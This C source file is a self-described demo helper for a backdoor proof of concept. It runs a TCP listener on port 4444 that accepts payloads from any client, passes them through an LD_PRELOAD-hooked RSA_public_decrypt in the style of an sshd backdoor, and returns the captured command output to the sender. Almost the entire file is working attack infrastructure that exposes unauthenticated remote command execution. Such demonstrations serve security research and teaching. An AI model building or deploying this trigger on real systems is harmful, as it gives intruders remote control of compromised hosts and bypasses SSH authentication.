/*
 * Backdoor Trigger Service — Demo Helper
 *
 * Runs alongside sshd in the target container. Listens on port 4444 and
 * feeds received data through RSA_public_decrypt (which is hooked by
 * our LD_PRELOAD backdoor). This simulates what happens during SSH key
 * exchange without requiring a full SSH client implementation.
 *
 * Protocol:
 *   Client sends: [payload_length (4 bytes, big-endian)] [payload]
 *   Server feeds payload through RSA_public_decrypt
 *   Server sends back: any stdout captured from the backdoor command
 *
 * This exists because reliably injecting payloads through the SSH protocol
 * during key exchange requires implementing a significant portion of the
 * SSH handshake. For a demo, this trigger service achieves the same result
 * (the same code path through RSA_public_decrypt is exercised).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <signal.h>

#include <openssl/rsa.h>
#include <openssl/bn.h>

#define TRIGGER_PORT    4444
#define MAX_PAYLOAD     8192
#define MAX_OUTPUT      65536

int main(void)
{
    int server_fd, client_fd;
    struct sockaddr_in addr;
    int opt = 1;

    signal(SIGCHLD, SIG_IGN);  /* Auto-reap children */

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return 1;
    }

    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(TRIGGER_PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        return 1;
    }

    if (listen(server_fd, 5) < 0) {
        perror("listen");
        return 1;
    }

    fprintf(stderr, "[trigger] Listening on port %d\n", TRIGGER_PORT);

    while (1) {
        client_fd = accept(server_fd, NULL, NULL);
        if (client_fd < 0) continue;

        /* Fork to handle each connection */
        pid_t pid = fork();
        if (pid < 0) {
            close(client_fd);
            continue;
        }
        if (pid > 0) {
            /* Parent */
            close(client_fd);
            continue;
        }

        /* Child — handle connection */
        close(server_fd);

        /* Read payload length (4 bytes, big-endian) */
        unsigned char len_buf[4];
        if (recv(client_fd, len_buf, 4, MSG_WAITALL) != 4) {
            close(client_fd);
            _exit(1);
        }

        unsigned int payload_len = (len_buf[0] << 24) | (len_buf[1] << 16)
                                 | (len_buf[2] << 8) | len_buf[3];

        if (payload_len > MAX_PAYLOAD) {
            close(client_fd);
            _exit(1);
        }

        /* Read payload */
        unsigned char *payload = malloc(payload_len);
        if (!payload) {
            close(client_fd);
            _exit(1);
        }

        ssize_t total = 0;
        while (total < (ssize_t)payload_len) {
            ssize_t n = recv(client_fd, payload + total, payload_len - total, 0);
            if (n <= 0) break;
            total += n;
        }

        if (total != (ssize_t)payload_len) {
            free(payload);
            close(client_fd);
            _exit(1);
        }

        /*
         * Redirect stdout to a pipe so we can capture the backdoor's
         * command output and send it back to the PoC trigger.
         */
        int pipefd[2];
        if (pipe(pipefd) < 0) {
            free(payload);
            close(client_fd);
            _exit(1);
        }

        pid_t exec_pid = fork();
        if (exec_pid == 0) {
            /* Grandchild — execute the RSA_public_decrypt call */
            close(pipefd[0]);
            dup2(pipefd[1], STDOUT_FILENO);
            close(pipefd[1]);

            /*
             * Create a dummy RSA key and call RSA_public_decrypt with
             * our payload. The LD_PRELOAD hook will intercept this call.
             */
            RSA *rsa = RSA_new();
            BIGNUM *n = BN_new();
            BIGNUM *e = BN_new();
            BN_set_word(n, 65537);
            BN_set_word(e, 65537);
            RSA_set0_key(rsa, n, e, NULL);

            unsigned char out[MAX_PAYLOAD];
            RSA_public_decrypt(payload_len, payload, out, rsa, RSA_PKCS1_PADDING);

            RSA_free(rsa);
            fflush(stdout);
            _exit(0);
        }

        /* Parent of grandchild — read output and send to client */
        close(pipefd[1]);
        free(payload);

        unsigned char output[MAX_OUTPUT];
        ssize_t out_total = 0;
        while (out_total < MAX_OUTPUT) {
            ssize_t n = read(pipefd[0], output + out_total, MAX_OUTPUT - out_total);
            if (n <= 0) break;
            out_total += n;
        }
        close(pipefd[0]);

        /* Wait for grandchild */
        int status;
        waitpid(exec_pid, &status, 0);

        /* Send output back to PoC trigger */
        if (out_total > 0) {
            send(client_fd, output, out_total, 0);
        }

        close(client_fd);
        _exit(0);
    }

    return 0;
}
